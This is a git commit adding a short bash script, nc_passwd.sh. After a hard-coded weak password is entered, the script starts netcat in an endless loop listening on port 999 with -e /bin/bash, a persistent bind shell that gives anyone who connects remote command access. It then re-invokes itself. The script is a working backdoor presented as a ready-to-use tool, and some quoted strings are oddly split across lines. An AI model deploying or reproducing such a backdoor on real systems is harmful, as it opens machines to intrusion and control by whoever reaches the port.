8a70ea8d6166cd240033af9289b933afaa313c00
wize <51327451+77697a65@users.noreply.github.com>
2020-01-02 20:23:29 +0000

    Create nc_passwd.sh

---
+++ nc_passwd.sh
@@ -0,0 +1,35 @@
+#! /bin/bash
+#
+ncpassword () {
+NC="
+/bin/netcat"
+
+PORT="
+999"
+
+PASSWORD="
+123456"
+
+SHELL="
+/bin/bash"
+
+echo -n "
+Enter password: "
+
+stty -echo
+read mypass
+stty echo
+if [ ${mypass} = $PASSWORD ]
+ then
+ echo "
+Access granted...start netcat shell on port $PORT"
+
+ while true; do $NC -l -p $PORT -e $SHELL; done
+ else
+ echo "
+Incorrect Password"
+
+fi
+}
+ncpassword
+sh $0
